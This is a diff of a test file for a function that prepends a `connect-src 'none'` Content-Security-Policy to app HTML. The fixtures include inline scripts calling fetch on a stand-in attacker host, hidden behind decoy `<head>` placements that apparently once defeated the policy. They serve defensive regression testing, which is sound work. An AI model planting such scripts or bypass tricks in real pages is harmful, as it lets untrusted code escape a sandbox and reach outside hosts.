@@ -73,38 +73,66 @@ describe("isAllowedGetPath", () => {
 });
 
 describe("withAppCsp", () => {
-  it("injects a connect-src 'none' CSP into the document head", () => {
-    const out = withAppCsp(
-      "<!doctype html><html><head><title>x</title></head><body>hi</body></html>",
-    );
-    expect(out).toContain("Content-Security-Policy");
-    expect(out).toContain("connect-src 'none'");
-    // CSP meta must land inside <head> so it parses before any inline script.
-    const headIdx = out.indexOf("<head>");
-    const cspIdx = out.indexOf("Content-Security-Policy");
-    expect(headIdx).toBeGreaterThanOrEqual(0);
-    expect(cspIdx).toBeGreaterThan(headIdx);
+  const POLICY_FIRST =
+    /^<!doctype html><meta http-equiv="Content-Security-Policy" content="[^"]*connect-src 'none'[^"]*">/;
+
+  it("puts the lockdown ahead of every byte the app supplied", () => {
+    const app =
+      "<!doctype html><html><head><title>x</title></head><body>hi</body></html>";
+    const out = withAppCsp(app);
+    expect(out).toMatch(POLICY_FIRST);
+    // The app's markup follows untouched: nothing in it is located or edited.
+    expect(out.endsWith(app)).toBe(true);
   });
 
-  it("is not shadowed by a commented-out <head> (security review finding 2)", () => {
-    const out = withAppCsp(
-      "<!-- <head> decoy --><html><head><script>fetch('https://evil.example')</script></head><body>x</body></html>",
-    );
-    // The decoy comment is stripped, so the CSP lands in the REAL head.
-    expect(out).toContain("connect-src 'none'");
-    expect(out).not.toContain("<!--");
-    // CSP precedes the inline script in document order.
-    const cspIdx = out.indexOf("Content-Security-Policy");
-    const scriptIdx = out.indexOf("<script>");
-    expect(cspIdx).toBeGreaterThanOrEqual(0);
-    expect(cspIdx).toBeLessThan(scriptIdx);
+  // Each of these made a real browser run the app with NO lockdown when the
+  // policy was inserted after the first thing that looked like "<head".
+  it.each([
+    [
+      "a <header> element",
+      "<header>x</header><script>fetch('https://evil.example')</script>",
+    ],
+    [
+      "<head> written inside a title",
+      "<html><title><head></title><script>fetch('https://evil.example')</script></html>",
+    ],
+    [
+      "<head> written inside a textarea",
+      "<textarea><head></textarea><script>fetch('https://evil.example')</script>",
+    ],
+    [
+      "<head> inside an attribute value",
+      "<div data-x=\"<head>\">x</div><script>fetch('https://evil.example')</script>",
+    ],
+    [
+      "<head> inside a comment",
+      "<!-- <head> --><html><head><script>fetch('https://evil.example')</script></head></html>",
+    ],
+    [
+      "an uppercase <HEAD> after a script",
+      "<script>fetch('https://evil.example')</script><HEAD></HEAD>",
+    ],
+    ["no head or html at all", "<div>just a fragment</div>"],
+    ["an empty app", ""],
+  ])("is not moved or shadowed by %s", (_name, app) => {
+    const out = withAppCsp(app);
+    expect(out).toMatch(POLICY_FIRST);
+    // Exactly one policy, and it comes before anything the app wrote.
+    expect(out.match(/Content-Security-Policy/g)).toHaveLength(1);
+    const firstAppByte = out.length - app.length;
+    expect(out.indexOf("Content-Security-Policy")).toBeLessThan(firstAppByte);
+    expect(out.slice(firstAppByte)).toBe(app);
   });
 
-  it("wraps fragments lacking <head>/<html> in a full CSP-protected document", () => {
-    const out = withAppCsp("<div>just a fragment</div>");
-    expect(out).toContain("connect-src 'none'");
-    expect(out).toContain("just a fragment");
-    expect(out.startsWith("<!doctype html>")).toBe(true);
+  it("keeps a policy the app wrote itself from replacing ours", () => {
+    const app =
+      '<head><meta http-equiv="Content-Security-Policy" content="default-src *"></head>';
+    const out = withAppCsp(app);
+    expect(out).toMatch(POLICY_FIRST);
+    // Ours is first; a second policy can only tighten, never loosen.
+    expect(out.indexOf("connect-src 'none'")).toBeLessThan(
+      out.indexOf("default-src *"),
+    );
   });
 
   it("does not introduce any broker GET path beyond the existing allowlist", () => {
